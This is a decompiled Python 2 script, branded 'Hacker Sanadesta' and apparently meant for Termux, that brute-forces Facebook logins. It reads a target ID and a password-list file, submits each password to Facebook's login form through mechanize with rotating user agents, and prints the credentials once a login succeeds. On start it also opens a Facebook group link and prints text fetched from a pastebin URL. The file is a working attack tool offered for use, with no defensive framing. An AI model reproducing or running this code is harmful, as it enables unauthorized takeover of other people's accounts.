# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Mar 20 2021, 14:58:25) 
# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
import os
os.system('termux-open-url "https://www.facebook.com/groups/1864140940265166/" ')
import time
import requests
import sys as n
import time as mm
#TweakPY
count = 0
def slow(M):
    for c in M + '\n':
        n.stdout.write(c)
        n.stdout.flush()
        mm.sleep(1. / 200)
p = requests.get('https://pastebin.com/raw/Ny4wFkf8').text
slow('\x1b[1;32m'+p)
A = '\x1b[0m\x1b[01;36m'
B = '\x1b[1;32m'
C = '\x1b[1;33m'
D = '\x1b[1;34m'
E = '\x1b[1;35m'
F = '\x1b[1;36m'
grb = '@:[1864140940265166]'
print B
print A
ok = ('\n \n    hi Sanadesta\n o            o\n  \\          /\n   \\        /\n    :-\'""\'-:\n .-\'  ____  `-.\n( (  (_()_)  ) )\n `-.   ^^   .-\'\n    `._==_.\'\n     __)(___\n\x1b[95m   _   _   _   _   _   _   _   _   _  \n  / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ \n ( S | A | N | A | D | E | S | T | A )\n  \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \n\x1b[00mHacker Sanadesta\t\n\x1b[95mFACEBOOK ADMIN :: https://www.facebook.com/profile.php?id=100041111658276\n\n\n======================= ')
print ok
import sys, mechanize, cookielib, random
W = '\x1b[1;37;40m'
Br = '\x1b[1;31;40m'
Bg = '\x1b[1;32;40m'
Y = '\x1b[1;33;40m'
Bb = '\x1b[1;34;40m'
Bm = '\x1b[1;35;40m'
Bc = '\x1b[1;36;40m'
email = str(raw_input('\x1b[93m++++++++++++ \x1b[94mId \xef\xba\x94\xef\xbb\xb4\xef\xba\xa4\xef\xba\xbf \x1b[91m =================> '))
passwordlist = str(raw_input('\x1b[93m++++++++++ \x1b[94m \xef\xba\x95\xef\xba\x8d\xef\xba\xa9\xef\xba\xad\xef\xbb\xae\xef\xba\xb3\xef\xba\x8e\xef\xba\x92\xef\xbb\x9f \xef\xba\x94\xef\xbb\xa4\xef\xba\x8b\xef\xba\x8e\xef\xbb\x97  \x1b[91m =================> '))
login = 'https://www.facebook.com/login.php?login_attempt=1'
useragents = [
 ('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

def main():
    global br
    br = mechanize.Browser()
    cj = cookielib.LWPCookieJar()
    br.set_handle_robots(False)
    br.set_handle_redirect(True)
    br.set_cookiejar(cj)
    br.set_handle_equiv(True)
    br.set_handle_referer(True)
    br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    welcome()
    search()
    print '[PRO]....... \xef\xba\xa9\xef\xba\xad\xef\xbb\xae\xef\xba\xb3\xef\xba\x8e\xef\xba\x92\xef\xbb\x9f \xef\xba\xaa\xef\xba\x9f\xef\xbb\xae\xef\xbb\xb3\xef\xbb\xbb .........'


def brute(password):
    sys.stdout.write(('\r\x1b[95m=========[P\xc2\xaeO]======= \xef\xbb\xa6\xef\xbb\xb4\xef\xbb\xa4\xef\xba\xa8\xef\xba\x97\x1b[4m ::::::::::::::> {}\n').format(password))
    sys.stdout.flush()
    br.addheaders = [('User-agent', random.choice(useragents))]
    site = br.open(login)
    br.select_form(nr=0)
    br.form['email'] = email
    br.form['pass'] = password
    sub = br.submit()
    log = sub.geturl()
    if log != login and 'login_attempt' not in log:
        print Bg + '\n\n\x1b[27m======================> Email/Phone: ' + email + (' Password: {}').format(password) + W
        m = raw_input('\x1b[1m \xd8\x9f\xd8\x9f \xef\xba\x94\xef\xbb\xb4\xef\xba\xa4\xef\xba\xbf \xef\xbb\x86\xef\xbb\x94\xef\xba\xa3\xd8\x9f\xd8\x9f (y/n)')
        if m == 'y':
            exit()
        elif m == 'n':
            intro()


def search():
    global password
    passwords = open(passwordlist, 'r')
    for password in passwords:
        password = password.replace('\n', '')
        brute(password)


def welcome():
    total = open(passwordlist, 'r')
    total = total.readlines()


if __name__ == '__main__':
    main()